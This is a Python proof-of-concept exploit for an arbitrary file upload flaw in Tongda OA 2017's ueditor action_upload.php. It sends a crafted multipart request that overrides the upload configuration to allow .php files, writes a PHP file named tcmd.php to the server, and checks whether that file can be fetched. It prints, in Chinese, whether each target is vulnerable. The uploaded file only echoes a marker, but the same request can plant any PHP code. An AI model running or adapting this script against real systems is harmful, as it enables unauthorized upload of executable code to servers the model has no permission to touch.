import requests
import urllib3
import sys
from random import Random

urllib3.disable_warnings()


sign = ''
chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
length = len(chars) - 1
random = Random()
for i in range(8):
    sign += chars[random.randint(0, length)]

shell = '''<?php echo "This is unsafe by {}";?>'''.format(sign)

payload='''-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

'''+shell+'''
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--'''

header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
          "Content-Type": "multipart/form-data;boundary=---------------------------55719851240137822763221368724",
          "Accept-Encoding": "gzip"
          }
payload2='/module/ueditor/php/action_upload.php?action=uploadfile'
payload3='/tcmd.php'

def test(host):
    url = host+payload2
    url2 = host+payload3
    try:
        requests.post(url, headers=header, timeout=3, verify=False,data=payload)
        req2 = requests.get(url2,timeout=3, verify=False)
        if req2.status_code == 200:
            print(host+"存在通达OA2017 action_upload.php任意文件上传漏洞")
            print("返回路径：" + url2+'\n')
        else:
            print(host + " 不存在通达OA2017 action_upload.php任意文件上传漏洞")
    except Exception as e:
        print(host + " 不存在通达OA2017 action_upload.php任意文件上传漏洞")

if __name__=="__main__":
    host = sys.argv[1]
    test(host)
